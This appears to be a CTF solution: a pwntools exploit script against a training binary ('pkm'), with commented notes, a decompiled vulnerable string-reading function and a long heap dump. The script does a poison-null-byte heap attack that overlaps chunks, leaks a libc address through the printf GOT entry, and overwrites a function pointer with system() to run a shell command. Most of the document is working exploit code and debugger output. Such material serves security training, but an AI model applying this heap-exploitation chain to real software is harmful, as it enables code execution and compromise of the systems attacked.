from pwn import *
from sys import *
from time import sleep

SERVER = "bin.training.offdef.it"
PORT = "2025"
BINARY = "./pkm_patched"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        #b*0x0401b3d
        #b*0x4017b4
        #b*0x0401a4c
        b*0x00401a0f
        c
        """)
    #input("wait")

timesleep = 0.1# there is the alarm, so it has to be fast 
pokemons = [0 for i in range(0x32)]

#code functions
def addPkm():
    global pokemons

    r.recvuntil(b'>')
    r.sendline(b'0')
    sleep(timesleep)
    for i in range(len(pokemons)):
        if pokemons[i]==0:
            pokemons[i]=1
            print("[:] Pokemon %d added" %i)
            return i
    return -1

def renamePkm(index, length, name):
    r.recvuntil(b'>')
    r.sendline(b'1')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)
    r.recvuntil(b':')
    r.sendline(b"%d" % length)
    sleep(timesleep)
    if len(name)==length:
        r.send(name)
        sleep(timesleep)
    else: 
        r.sendline(name)
        sleep(timesleep)
    print("[:] Pokemon %d renamed %d" %(index, length))

def killPkm(index):
    global pokemons
    pokemons[index]=0
    r.recvuntil(b'>')
    r.sendline(b'2')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)
    print("[:] Pokemon %d killed" %index)

def fightPkm(index_pokemon, index_move, index_reciver_move):
    global pokemons
    if pokemons[index_pokemon]!=1 or pokemons[index_reciver_move]!=1:
        print("BRO NON ESISTONO QUESTI POKEMON COME CAZZO PROGRAMMI")
        exit(0)
    r.recvuntil(b'>')
    r.sendline(b'3')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_pokemon)
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_move)
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_reciver_move)
    sleep(timesleep)

def infoPkm(index):
    global pokemons
    if pokemons[index]!=1:
        print("BRO NON ESISTONO QUESTI POKEMON COME CAZZO PROGRAMMI")
        exit(0)
    r.recvuntil(b'>')
    r.sendline(b'4')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)
    x = r.recvuntil(b'***************')
    x = createInfoObj(x)
    print("[:] Info Pokemon %d" %index)
    print("\t"+str(x))
    return x

def createInfoObj(x):
    x=x.split(b'\n')
    x = [i.split(b':') for i in x]
    obj = {}

    obj['Name'] = x[0][1].strip()
    obj['ATK'] =x[1][1].strip()
    obj['DEF'] =x[2][1].strip()
    obj['HP'] =x[3][1].strip()
    obj['Moves'] =x[4][1].strip()
    return obj

def exitPkm():
    r.recvuntil(b'>')
    r.sendline(b'5')
    sleep(timesleep)


#preparing poison null byte
A = addPkm()
B = addPkm()
renamePkm(A, 0x100, b'PIPPO')
renamePkm(B, 0x200, b'PIPPO')
C = addPkm()
renamePkm(B, 0x500, b'PIPPO')
renamePkm(A, 0x108, b'A'*0x108)
B1 = addPkm()
B2 = addPkm()
killPkm(B1)
killPkm(C)

#leaking libc
libc= ELF("./libc-2.27_notcache.so")
printfaddr = 0x404030
heap_segment = b'B'*0xf0 +(b'\x00\x01'.ljust(8,b'\x00'))*2 
heap_segment+= b'\x28'.ljust(8, b'\x00')+b'\x1a'.ljust(8, b'\x00')
heap_segment+= (b'\x64'.ljust(8, b'\x00'))*2+b'\x00'*8+p64(printfaddr)
heap_segment+= b'\x04'.ljust(8, b'\x00') + b'\x00'*32

renamePkm(B, 0x200,heap_segment)

infoB2=infoPkm(B2)
leak_libc =u64(infoB2['Name'].ljust(8,b'\x00'))
libc_offset = 0x63830
libc.address = leak_libc-libc_offset
print("[!] Libc addr --> %x" %libc.address)

#run system('bin/cat flag') cat flag so it is fast
system_libc_addr = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
moveText = 0x40202f

heap_segment = b'B'*0xf0 +(b'\x00\x01'.ljust(8,b'\x00'))*2 
heap_segment+= b"/bin/cat flag".ljust(16, b'\x00')
heap_segment+= (b'\x64'.ljust(8, b'\x00'))*2+b'\x00'*8+p64(printfaddr)
heap_segment+= b'\x04'.ljust(8, b'\x00') + b'\x00'*32
heap_segment+= p64(moveText)
heap_segment+= p64(system_libc_addr)

renamePkm(B, 0x200,heap_segment)
fightPkm(B2, 0, A)

r.interactive()


'''
this challenge was very difficult to me. Basycally you have to do a Poison Null Byte attack. 
As you can see I renamed the partition index as you can find them in the slides to better
understand the logic behind it.

In this code making a new pkm (addPkm) malloc 0x110 of memory, whereas during the rename you
can malloc how much memory you need. In addiction the killPkm makes a free on the pkm and the name
memory, whereas the rename itself, before making the malloc, free the same partion. 

The only vulnerability usable was this one

void * get_string(void)

{
  long in_FS_OFFSET;
  uint length;
  uint i;
  void *string_addr;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  length = 0;
  while (length == 0) {
    printf("[.] insert length: ");
    __isoc99_scanf(&DAT_0040204e,&length);
  }
  string_addr = malloc((ulong)length);
  i = 0;
  while ((i < length &&
         (read(0,(void *)((long)string_addr + (ulong)i),1),
         *(char *)((long)string_addr + (ulong)i) != '\n'))) {
    i = i + 1;
  }
  *(undefined *)((long)string_addr + (ulong)i) = 0;
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return string_addr;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

as you can see it append a 0 at the end of the memory. So if you carefully append this byte at the
beginning of the next chunck you can do crazy stuff.

After #preparing poison null byte# the heap was this 

0x808000	0x0000000000000000	0x0000000000000101	................
0x808010	0x0000000000000028	0x000000000000000a	(...............
0x808020	0x0000000000000064	0x0000000000000064	d.......d.......
0x808030	0x0000000000000000	0x0000000000808210	................
0x808040	0x0000000000000000	0x0000000000000000	................
0x808050	0x0000000000000000	0x0000000000000000	................
0x808060	0x0000000000000000	0x0000000000000000	................
0x808070	0x0000000000000000	0x0000000000000000	................
0x808080	0x0000000000000000	0x0000000000000000	................
0x808090	0x0000000000000000	0x0000000000000000	................
0x8080a0	0x0000000000000000	0x0000000000000000	................
0x8080b0	0x0000000000000000	0x0000000000000000	................
0x8080c0	0x0000000000000000	0x0000000000000000	................
0x8080d0	0x0000000000000000	0x0000000000000000	................
0x8080e0	0x0000000000000000	0x0000000000000000	................
0x8080f0	0x0000000000000000	0x0000000000000000	................
0x808100	0x0000000000000000	0x0000000000000101	................
0x808110	0x0000000000000028	0x000000000000000a	(...............
0x808120	0x0000000000000064	0x0000000000000064	d.......d.......
0x808130	0x0000000000000000	0x0000000000808630	........0.......
0x808140	0x0000000000000001	0x0000000000000000	................
0x808150	0x0000000000000000	0x0000000000000000	................
0x808160	0x0000000000000000	0x0000000000000000	................
0x808170	0x0000000000000000	0x0000000000000000	................
0x808180	0x0000000000000000	0x0000000000000000	................
0x808190	0x0000000000000000	0x0000000000000000	................
0x8081a0	0x0000000000000000	0x0000000000000000	................
0x8081b0	0x0000000000000000	0x0000000000000000	................
0x8081c0	0x0000000000000000	0x0000000000000000	................
0x8081d0	0x0000000000000000	0x0000000000000000	................
0x8081e0	0x0000000000000000	0x0000000000000000	................
0x8081f0	0x0000000000000000	0x0000000000000000	................
0x808200	0x0000000000000000	0x0000000000000111	................
0x808210	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808220	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808230	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808240	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808250	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808260	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808270	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808280	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808290	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082e0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x8082f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808300	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x808310	0x4141414141414141	0x0000000000000311	AAAAAAAA........	 <-- unsortedbin[all][0]
0x808320	0x0000727caf5e2c80	0x0000727caf5e2c80	.,^.|r...,^.|r..
0x808330	0x0000000000000064	0x0000000000000064	d.......d.......
0x808340	0x0000000000000000	0x0000000000402036	........6 @.....
0x808350	0x0000000000000003	0x0000000000000000	................
0x808360	0x0000000000000000	0x0000000000000000	................
0x808370	0x0000000000000000	0x0000000000000000	................
0x808380	0x0000000000000000	0x0000000000000000	................
0x808390	0x0000000000000000	0x0000000000000000	................
0x8083a0	0x0000000000000000	0x0000000000000000	................
0x8083b0	0x0000000000000000	0x0000000000000000	................
0x8083c0	0x0000000000000000	0x0000000000000000	................
0x8083d0	0x0000000000000000	0x0000000000000000	................
0x8083e0	0x0000000000000000	0x0000000000000000	................
0x8083f0	0x0000000000000000	0x0000000000000000	................
0x808400	0x0000000000000000	0x0000000000000000	................
0x808410	0x0000000000000100	0x0000000000000100	................
0x808420	0x0000000000000028	0x000000000000000a	(...............
0x808430	0x0000000000000064	0x0000000000000064	d.......d.......
0x808440	0x0000000000000000	0x0000000000402036	........6 @.....
0x808450	0x0000000000000004	0x0000000000000000	................
0x808460	0x0000000000000000	0x0000000000000000	................
0x808470	0x0000000000000000	0x0000000000000000	................
0x808480	0x0000000000000000	0x0000000000000000	................
0x808490	0x0000000000000000	0x0000000000000000	................
0x8084a0	0x0000000000000000	0x0000000000000000	................
0x8084b0	0x0000000000000000	0x0000000000000000	................
0x8084c0	0x0000000000000000	0x0000000000000000	................
0x8084d0	0x0000000000000000	0x0000000000000000	................
0x8084e0	0x0000000000000000	0x0000000000000000	................
0x8084f0	0x0000000000000000	0x0000000000000000	................
0x808500	0x0000000000000000	0x0000000000000000	................
0x808510	0x0000000000000000	0x0000000000000001	................
0x808520	0x0000000000000210	0x0000000000000100	................
0x808530	0x0000000000000028	0x000000000000000a	(...............
0x808540	0x0000000000000064	0x0000000000000064	d.......d.......
0x808550	0x0000000000000000	0x0000000000402036	........6 @.....
0x808560	0x0000000000000002	0x0000000000000000	................
0x808570	0x0000000000000000	0x0000000000000000	................
0x808580	0x0000000000000000	0x0000000000000000	................
0x808590	0x0000000000000000	0x0000000000000000	................
0x8085a0	0x0000000000000000	0x0000000000000000	................
0x8085b0	0x0000000000000000	0x0000000000000000	................
0x8085c0	0x0000000000000000	0x0000000000000000	................
0x8085d0	0x0000000000000000	0x0000000000000000	................
0x8085e0	0x0000000000000000	0x0000000000000000	................
0x8085f0	0x0000000000000000	0x0000000000000000	................
0x808600	0x0000000000000000	0x0000000000000000	................
0x808610	0x0000000000000000	0x0000000000000000	................
0x808620	0x0000000000000310	0x0000000000000510	................
0x808630	0x0000004f50504950	0x0000000000000000	PIPPO...........
0x808640	0x0000000000000000	0x0000000000000000	................
0x808650	0x0000000000000000	0x0000000000000000	................
0x808660	0x0000000000000000	0x0000000000000000	................
0x808670	0x0000000000000000	0x0000000000000000	................
0x808680	0x0000000000000000	0x0000000000000000	................
0x808690	0x0000000000000000	0x0000000000000000	................
0x8086a0	0x0000000000000000	0x0000000000000000	................
0x8086b0	0x0000000000000000	0x0000000000000000	................
0x8086c0	0x0000000000000000	0x0000000000000000	................
0x8086d0	0x0000000000000000	0x0000000000000000	................
0x8086e0	0x0000000000000000	0x0000000000000000	................
0x8086f0	0x0000000000000000	0x0000000000000000	................
0x808700	0x0000000000000000	0x0000000000000000	................
0x808710	0x0000000000000000	0x0000000000000000	................
0x808720	0x0000000000000000	0x0000000000000000	................
0x808730	0x0000000000000000	0x0000000000000000	................
0x808740	0x0000000000000000	0x0000000000000000	................
0x808750	0x0000000000000000	0x0000000000000000	................
0x808760	0x0000000000000000	0x0000000000000000	................
0x808770	0x0000000000000000	0x0000000000000000	................
0x808780	0x0000000000000000	0x0000000000000000	................
0x808790	0x0000000000000000	0x0000000000000000	................
0x8087a0	0x0000000000000000	0x0000000000000000	................
0x8087b0	0x0000000000000000	0x0000000000000000	................
0x8087c0	0x0000000000000000	0x0000000000000000	................
0x8087d0	0x0000000000000000	0x0000000000000000	................
0x8087e0	0x0000000000000000	0x0000000000000000	................
0x8087f0	0x0000000000000000	0x0000000000000000	................
0x808800	0x0000000000000000	0x0000000000000000	................
0x808810	0x0000000000000000	0x0000000000000000	................
0x808820	0x0000000000000000	0x0000000000000000	................
0x808830	0x0000000000000000	0x0000000000000000	................
0x808840	0x0000000000000000	0x0000000000000000	................
0x808850	0x0000000000000000	0x0000000000000000	................
0x808860	0x0000000000000000	0x0000000000000000	................
0x808870	0x0000000000000000	0x0000000000000000	................
0x808880	0x0000000000000000	0x0000000000000000	................
0x808890	0x0000000000000000	0x0000000000000000	................
0x8088a0	0x0000000000000000	0x0000000000000000	................
0x8088b0	0x0000000000000000	0x0000000000000000	................
0x8088c0	0x0000000000000000	0x0000000000000000	................
0x8088d0	0x0000000000000000	0x0000000000000000	................
0x8088e0	0x0000000000000000	0x0000000000000000	................
0x8088f0	0x0000000000000000	0x0000000000000000	................
0x808900	0x0000000000000000	0x0000000000000000	................
0x808910	0x0000000000000000	0x0000000000000000	................
0x808920	0x0000000000000000	0x0000000000000000	................
0x808930	0x0000000000000000	0x0000000000000000	................
0x808940	0x0000000000000000	0x0000000000000000	................
0x808950	0x0000000000000000	0x0000000000000000	................
0x808960	0x0000000000000000	0x0000000000000000	................
0x808970	0x0000000000000000	0x0000000000000000	................
0x808980	0x0000000000000000	0x0000000000000000	................
0x808990	0x0000000000000000	0x0000000000000000	................
0x8089a0	0x0000000000000000	0x0000000000000000	................
0x8089b0	0x0000000000000000	0x0000000000000000	................
0x8089c0	0x0000000000000000	0x0000000000000000	................
0x8089d0	0x0000000000000000	0x0000000000000000	................
0x8089e0	0x0000000000000000	0x0000000000000000	................
0x8089f0	0x0000000000000000	0x0000000000000000	................
0x808a00	0x0000000000000000	0x0000000000000000	................
0x808a10	0x0000000000000000	0x0000000000000000	................
0x808a20	0x0000000000000000	0x0000000000000000	................
0x808a30	0x0000000000000000	0x0000000000000000	................
0x808a40	0x0000000000000000	0x0000000000000000	................
0x808a50	0x0000000000000000	0x0000000000000000	................
0x808a60	0x0000000000000000	0x0000000000000000	................
0x808a70	0x0000000000000000	0x0000000000000000	................
0x808a80	0x0000000000000000	0x0000000000000000	................
0x808a90	0x0000000000000000	0x0000000000000000	................
0x808aa0	0x0000000000000000	0x0000000000000000	................
0x808ab0	0x0000000000000000	0x0000000000000000	................
0x808ac0	0x0000000000000000	0x0000000000000000	................
0x808ad0	0x0000000000000000	0x0000000000000000	................
0x808ae0	0x0000000000000000	0x0000000000000000	................
0x808af0	0x0000000000000000	0x0000000000000000	................
0x808b00	0x0000000000000000	0x0000000000000000	................
0x808b10	0x0000000000000000	0x0000000000000000	................
0x808b20	0x0000000000000000	0x0000000000000000	................
0x808b30	0x0000000000000000	0x00000000000204d1	................	 <-- Top chunk

at address 0x808410 you can see the B2 chunk which is easily overwrittable
by the rename of B. By doing it I can write whatever I want on B2. 

In fact I setted the right stuff to leak the libc and then make a system call.
I found the rigth spot by debugging and looking at the code. 

'''